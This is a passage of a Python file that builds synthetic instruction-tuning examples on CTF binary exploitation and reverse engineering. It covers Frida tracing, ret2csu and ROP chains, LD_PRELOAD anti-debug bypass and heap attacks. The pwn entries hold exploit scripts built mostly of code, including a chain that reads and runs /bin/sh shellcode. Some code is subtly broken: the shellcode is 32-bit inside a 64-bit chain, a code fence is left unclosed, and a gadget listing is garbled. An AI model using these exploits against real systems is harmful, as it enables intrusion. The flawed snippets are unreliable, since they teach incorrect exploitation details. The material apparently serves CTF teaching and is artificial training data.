        "output": "## Frida Dynamic Analysis\n\n### Basic function call tracing\n```python\nimport frida\nimport sys\n\ndef on_message(message, data):\n    if message['type'] == 'send':\n        print(f\"[*] {message['payload']}\")\n    else:\n        print(f\"[!] {message}\")\n\n# Spawn the binary\nsession = frida.spawn(['./binary'])\nscript_code = '''\n// Trace all puts calls to see output\nvar puts_addr = Module.findExportByName('libc.so.6', 'puts');\nInterceptor.attach(puts_addr, {\n    onEnter: function(args) {\n        this.msg = Memory.readUtf8String(args[0]);\n    },\n    onLeave: function(retval) {\n        send('puts(\"' + this.msg + '\")');\n    }\n});\n\n// Trace strncmp to see comparison values\nvar strncmp_addr = Module.findExportByName('libc.so.6', 'strncmp');\nInterceptor.attach(strncmp_addr, {\n    onEnter: function(args) {\n        var s1 = Memory.readUtf8String(args[0]);\n        var s2 = Memory.readUtf8String(args[1]);\n        var n = args[2].toInt32();\n        send('strncmp(\"' + s1 + '\", \"' + s2 + '\", ' + n + ')');\n    }\n});\n'''\n\nscript = session.create_script(script_code)\nsession.resume()\nscript.on('message', on_message)\nscript.load()\n\ninput(\"[*] Press Enter to exit...\")\n```\n\n### Trace comparisons (CMP instructions)\n```javascript\n// Hook at specific addresses (no symbols)\nInterceptor.attach(ptr('0x401234'), {\n    onEnter: function(args) {\n        var rdi = this.context.rdi;\n        var rsi = this.context.rsi;\n        send('CMP: 0x' + rdi.toString(16) + ' vs 0x' + rsi.toString(16));\n    }\n});\n```\n\n### Read memory\n```javascript\n// Read specific address\nvar addr = ptr('0x404010');\nvar data = Memory.readByteArray(addr, 32);\nsend('Memory at 0x404010:', data);\n\n// Scan for patterns\nvar matches = Memory.scan(ptr('0x400000'), 0x10000, '48 89 e5 48 83 ec 20', {\n    onMatch: function(address, size) {\n        send('Found pattern at: ' + address.toString());\n    },\n    onComplete: function() {\n        send('Scan complete');\n    }\n});\n```\n\n### Frida CLI (quick usage)\n```bash\n# Spawn with tracing\nfrida -f ./binary -e 'Interceptor.attach(ptr(\"puts\"), { onEnter(args) { send(Memory.readUtf8String(args[0])); } })'\n\n# Attach to running process\nfrida -p <pid> -e 'console.log(Process.enumerateModules().map(m => m.name).join(\"\\n\"));'\n```"
    },

    # ========== PWN: ret2csu ==========
    {
        "instruction": "Explain the __libc_csu_init universal gadget and how to use it for arbitrary calls",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, no canary, no PIE. Only 2 useful gadgets found with ROPgadget. Need a way to set RSI and RDX for a libc call.",
        "output": "## ret2csu: Universal ROP Gadget\n\n### What it is\n`__libc_csu_init` is present in almost all dynamically-linked ELF binaries. It contains two useful gadgets that let you set registers (RDI, RSI, RDX, R12-R15) with minimal gadgets.\n\n### The two gadgets\n\n**Gadget 1 (call gadgets):**\n```asm\npop rbx    ; set to 0\npop rbp    ; set to 1 (so rbp*8+rdx == rdx when rbx=0)\npop r12    ; r12 → call *(r12 + rbx*8)\npop r13    ; r13 → rdx\npop r14    ; r14 → rsi  \npop r15    ; r15 → rdi\nret\n```\n\n**Gadget 2 (call setup):**\n```asm\ndword ptr [r12 + rbx*8]  ; call address\nmov rdx, r13             ; set rdx\nmov rsi, r14             ; set rsi  \nmov rdi, r15             ; set rdi\n```\n\n### Using it\n```python\nfrom pwn import *\n\n# Gadget addresses\npop_csu = 0x4006a6  # pop rbx-r15 + ret\ncall_csu = 0x400690  # call [r12+rbx*8]\n\n# Target: call puts(puts@GOT)\nputs_plt = 0x400520\ngot_puts = 0x401018\n\npayload = b'A' * 72\n\n# First CSU: setup r12-r15 for the call\npayload += p64(pop_csu)\npayload += p64(0)        # rbx = 0\npayload += p64(1)        # rbp = 1\npayload += p64(got_puts) # r12 → call *(r12)\npayload += p64(0)        # r13 → rdx\npayload += p64(0)        # r14 → rsi\npayload += p64(1)        # r15 → rdi (arg0 = 1 for fd=1)\npayload += p64(call_csu)  # jump to call [r12]\n\n# After the call, rbx=rbp+1 fails, so execution continues\n# Add padding for the extra pop/ret sequence\npayload += p64(0) * 7\n\np.sendline(payload)\n```\n\n### Limitations\n- rdi can only be set as 64-bit value via r15\n- rbx is always 0 (for clean execution)\n- Call target must be at r12 (indirect call)\n- Doesn't support all registers simultaneously"
    },

    # ========== RE: keygen ==========
    {
        "instruction": "Explain how to solve a CTF keygen challenge",
        "category": "rev",
        "input": "Binary takes a username and license key as input. It computes something from the username and compares it to the key. I need to generate a valid key for any username.",
        "output": "## Keygen Challenges\n\n### Common keygen patterns\n\n#### Pattern 1: Simple hash/checksum\n```\nkey = checksum(username)\n# Example: key = sum(ord(c) for c in username) * 1337\n```\n\n#### Pattern 2: Rolling hash\n```\nkey = hash(username, seed)\n# CRC32, MD5, SHA1, custom rolling hash\n```\n\n#### Pattern 3: Transformation chain\n```\nkey = transform(username)\n# XOR, multiply, modulo arithmetic, bitwise ops\n```\n\n### Solution workflow\n\n```python\n# 1. Extract the validation function logic from decompiled code\n\n# In Ghidra/r2, find the comparison block\n# It typically does: computed_value == entered_key\n\n# 2. Reimplement the algorithm in Python\n\ndef compute_key(username):\n    # Reimplement the operations found in disassembly\n    key = 0\n    for c in username:\n        key = ((key << 5) + key + ord(c)) & 0xFFFFFFFF  # djb2-like\n    return key\n\n# 3. Generate valid key\nusername = \"test_user\"\nvalid_key = compute_key(username)\nprint(f\"Key: {valid_key}\")\n\n# 4. Verify with the binary\nimport subprocess\nresult = subprocess.run(['./binary', username, str(valid_key)],\n                       capture_output=True, text=True)\nif 'success' in result.stdout.lower():\n    print(f\"Valid key found: {valid_key}\")\n```\n\n### Common hash patterns in CTF\n| Hash | Typical signature |\n|------|------------------|\n| CRC32 | Lookup table (256 * 4 bytes), polynomial 0xEDB88320 |\n| MD5 | 4 state variables (A,B,C,D), 64 rounds, specific constants |\n| SHA1 | 5 state variables, 80 rounds, specific constants |\n| Murmur3 | 32-bit seed, bit mixing, finalization |\n| djb2 | `hash = 5381; hash = hash*33 + c` |\n\n### Verification\nAlways verify your keygen by running it against the binary before submitting."
    },

    # ========== PWN: ROP chain with full gadgets ==========
    {
        "instruction": "Provide a complete ROP chain for calling read(0, bss, 0x200) then jumping to bss on a typical CTF binary",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, no PIE, no canary. Need to read arbitrary shellcode into .bss and jump there. Available: pop rdi;ret (0x4006e8), pop rsi;pop r15;ret (0x4006e6), pop rdx;pop r12;pop r13;pop r14;pop r15;ret (0x400690), bss at 0x601080.",
        "output": "## Complete ROP Chain: read() → shellcode\n\n### Strategy\n1. ROP to `read(0, bss, 0x200)` — reads shellcode from stdin to .bss\n2. Return to .bss — executes our shellcode\n\n### Building the chain\n\n```python\nfrom pwn import *\n\nbinary = ELF('./vuln')\np = process('./vuln')\n\n# Gadgets\npop_rdi = 0x4006e8      # pop rdi; ret\npop_rsi_r15 = 0x4006e6  # pop rsi; pop r15; ret\npop_rdx_r12_r13_r14_r15 = 0x400690  # pop rdx; pop r12-15; ret\n\nbss = 0x601080\nstdin_fd = 0\nread_size = 0x200\n\n# --- Stage 1: read(0, bss, 0x200) ---\n\n# RDI = 0 (stdin)\npayload = b'A' * 72\npayload += p64(pop_rdi)\npayload += p64(stdin_fd)\n\n# RSI = bss\npayload += p64(pop_rsi_r15)\npayload += p64(bss)\npayload += p64(0)  # dummy for r15\n\n# RDX = 0x200\npayload += p64(pop_rdx_r12_r13_r14_r15)\npayload += p64(read_size)\npayload += p64(0)  # r12\npayload += p64(0)  # r13\npayload += p64(0)  # r14\npayload += p64(0)  # r15\n\n# Call read@PLT\npayload += p64(binary.plt['read'])\n\n# --- Stage 2: jump to bss (execute shellcode) ---\npayload += p64(bss)\n\n# Send stage 1 payload\np.sendline(payload)\n\n# Wait for read to finish, then send shellcode\nimport time\ntime.sleep(0.5)\n\nshellcode = (\n    b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e'\n    b'\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\n)\n\np.send(shellcode)\np.interactive()\n```\n\n### Why this works\n1. Stage 1 is a ROP chain that calls read(0, bss, 0x200)\n2. `read` blocks waiting for stdin — we send our shellcode\n3. After read returns, the next address on the stack is `bss`\n4. CPU jumps to bss and executes our shellcode\n\n### Stack alignment note\nOn x86-64, the System V ABI requires 16-byte stack alignment at function calls. Add a `ret` gadget before calling library functions if you get SIGSEGV:\n\n```python\nret = 0x4006a6  # any 'ret' gadget\npayload += p64(ret)  # alignment padding\npayload += p64(binary.plt['read'])\n```"
    },

    # ========== RE: dynamic library hooking ==========
    {
        "instruction": "Explain how to hook library functions with LD_PRELOAD",
        "category": "rev",
        "input": "A binary calls ptrace() to detect debuggers. I want to bypass this without patching the binary. Can I use LD_PRELOAD?",
        "output": "## LD_PRELOAD Function Hooking\n\n### How LD_PRELOAD works\nLD_PRELOAD makes the dynamic linker load your library *before* libc. Your function definitions shadow the originals.\n\n### Bypass ptrace with LD_PRELOAD\n\n```c\n// fake_ptrace.c — compile with: gcc -shared -o fake_ptrace.so fake_ptrace.c\n#include <sys/ptrace.h>\n\n// Override ptrace to always succeed\nlong ptrace(int request, int pid, void *addr, void *data) {\n    return 0;  // pretend no debugger\n}\n```\n\n```bash\n# Use it\nLD_PRELOAD=./fake_ptrace.so ./binary\n\n# Or permanently:\nexport LD_PRELOAD=/path/to/fake_ptrace.so\n./binary\n```\n\n### Other common overrides\n\n```c\n// Override clock_gettime (timing anti-debug)\n#include <time.h>\nint clock_gettime(clockid_t clk_id, struct timespec *tp) {\n    tp->tv_sec = 1000000;  // fake fast execution\n    tp->tv_nsec = 0;\n    return 0;\n}\n\n// Override exit to prevent clean exit\nvoid exit(int status) {\n    _exit(0);\n}\n\n// Override read() to inject known values\n#include <unistd.h>\nssize_t read(int fd, void *buf, size_t count) {\n    // Always return success with known data\n    memset(buf, 'A', count);\n    return count;\n}\n```\n\n### LD_PRELOAD vs patching vs Frida\n| Method | Pros | Cons |\n|--------|------|------|\n| LD_PRELOAD | No binary modification, simple C | Only works for libc calls, not internal functions |\n| Binary patching | Permanent, no runtime overhead | Requires identifying patch points, harder to undo |\n| Frida | Dynamic, can hook internal functions | Requires Frida installed, more complex |\n\n### Advanced: hooking internal functions\nLD_PRELOAD can't hook functions inside the binary itself (only shared libs). For internal functions, use:\n- **Frida**: `Interceptor.attach(ptr('0x401234'), ...)`\n- **Binary patching**: NOP the function or redirect to your function\n- **GOT overwrite**: write your function's address into the binary's GOT\n\n### Anti-LD_PRELOAD\nSome binaries check for LD_PRELOAD:\n```bash\n# Check if binary checks for LD_PRELOAD\nstrings binary | grep -i preload\n# If present: disable the check first (patch), then use LD_PRELOAD\n```"
    },

    # ========== PWN: heap consolidation ==========
    {
        "instruction": "Explain heap chunk consolidation and how to exploit it",
        "category": "pwn",
        "input": "Binary: 64-bit, glibc 2.31, NX, ASLR. Heap menu. Can allocate, free, and free-with-size. Need to exploit through unsorted bin consolidation.",
        "output": "## Heap Chunk Consolidation\n\n### What consolidation does\nWhen a free chunk is adjacent to another free chunk, glibc merges them into a larger chunk (binsize). This prevents many heap attacks but creates new exploitation paths.\n\n### When consolidation happens\n1. **Fastbin/Tcache**: chunks go directly into their bin (no consolidation)\n2. **Unsorted bin**: adjacent free chunks are merged before sorting\n3. **Top chunk**: adjacent free chunks merge with wilderness\n\n### Unsorted bin attack\nWhen a large chunk is freed, it goes into the unsorted bin. During malloc, chunks are sorted into appropriate bins. By manipulating fd/bk pointers, we can write to arbitrary addresses:\n\n```python\n# Unsorted bin attack: write libc_main_arena to arbitrary address\n# Step 1: Create a fake chunk with crafted fd/bk\n\n# Step 2: Free the chunk (goes to unsorted bin)\nfree(1)\n\n# Step 3: Overwrite fd to target address (needs UAF or overflow)\nedit(1, b'AAAA' + p64(0) + p64(target))\n\n# Step 4: Trigger malloc\nalloc(0, 0x90)  # when this chunk is processed, fd is written to target\n```\n\n### House of Force (glibc < 2.29)\nOverwrite top chunk size to 0xffffffffffffffff, then malloc a massive size to move top pointer:\n\n```python\n# 1. Overflow to overwrite top chunk size\nedit(0, b'A' * 0x20 + p64(0) + p64(0xffffffffffffffff))\n\n# 2. Calculate offset from top to target\noffset = target - top_chunk_addr - 0x20\nalloc(0, offset - 0x10)  # move top to near target\nalloc(0, 100)  # this allocation is now at target\n```\n\n### Tcache poisoning (simpler, glibc 2.27+)\n```python\n# Free a chunk, overwrite its fd, malloc to get arbitrary address\nfree(0)\n# If UAF: edit freed chunk to write target into fd\nedit(0, p64(target))\nalloc(0, 0x40)  # get chunk back\nalloc(0, 0x40)  # returns 'target' address\n```\n\n### Modern protections (glibc 2.31+)\n- tcache key (double-free detection)\n- Safe-linking (fd pointer XOR'd with address)\n- Bins sorted by size (prevents overlapping chunks)\n- Requires more sophisticated attacks: heap feng shui, partial overwrite, off-by-one"
    },

    # ========== RE: deobfuscation ==========
    {
        "instruction": "Explain techniques for deobfuscating protected binaries",
        "category": "rev",
        "input": "The binary has a heavily obfuscated main function with opaque predicates, dead code, and constant folding. How can I deobfuscate it?",
        "output": "## Deobfuscation Techniques\n\n### Common obfuscation types\n1. **Opaque predicates**: conditional branches that always go one way but look random\n2. **Dead code**: code that never executes but confuses analysis\n3. **Constant folding**: precomputed values split across multiple operations\n4. **Control flow flattening**: transforms if/else/loops into switch-based state machines\n5. **String encryption**: strings are encrypted and decrypted at runtime\n\n### Static deobfuscation\n\n#### 1. Constant folding resolution\n```python\n# If you see: a = 5; b = 3; c = a + b;\n# The obfuscated version might be:\n# a = x ^ y; b = x ^ z; c = a ^ b ^ z;  (where x,y,z are constants)\n# Trace back through a few instructions to find the simplified form\n\n# Use Ghidra's decompiler — it often handles constant folding\n# If that fails: manually trace values backward from the comparison\n```\n\n#### 2. Opaque predicate removal\nLook for patterns:\n```c\nif (x * (x + 1) % 2 == 0)  // ALWAYS TRUE (even*odd is even)\n// → remove the if, keep only the true branch\n\nif (x * x >= 0)  // ALWAYS TRUE for integers\n// → remove the if\n```\n\n#### 3. Dead code removal\n```python\n# If a branch is never reached:\n# If we see: if (condition) { real_code; } else { garbage; }\n# → keep only real_code block\n```\n\n### Dynamic deobfuscation (more reliable)\n\n#### FLOSS (flare-floss)\n```bash\n# Automatic deobfuscation\nfloss binary -o strings.json\n```\n\n#### angr symbolic execution\n```python\nimport angr\n\np = angr.Project('./binary')\ncfg = p.analyses.CFGFast()\n\n# Find function of interest\nfunc = p.kb.functions.get_by_addr(0x401000)\n\n# Symbolic execution to resolve values\nstate = p.factory.blank_state(addr=0x401000)\nsimgr = p.factory.simgr(state)\nsimgr.step()  # explore paths to find constant values\n``\n\n#### Frida runtime trace\n```python\n# Run the function, record all computed values at runtime\n# Then replace obfuscated expressions with their resolved values\n```\n\n### Best approach\nCombine static and dynamic: use Frida to trace execution, record values at key points, then annotate the decompiled code with the resolved values."
    },
]


def get_all_examples():
    """Return all synthetic examples as a list of dicts."""
    return SYNTHETIC_EXAMPLES


def save_to_file(output_path: str):
    """Save synthetic examples to JSONL file."""
    with open(output_path, "w") as f:
        for ex in SYNTHETIC_EXAMPLES:
            f.write(json.dumps(ex) + "\n")
    print(f"Saved {len(SYNTHETIC_EXAMPLES)} synthetic examples to {output_path}")


if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "data/raw/synthetic_rev_pwn.jsonl"
    save_to_file(out)
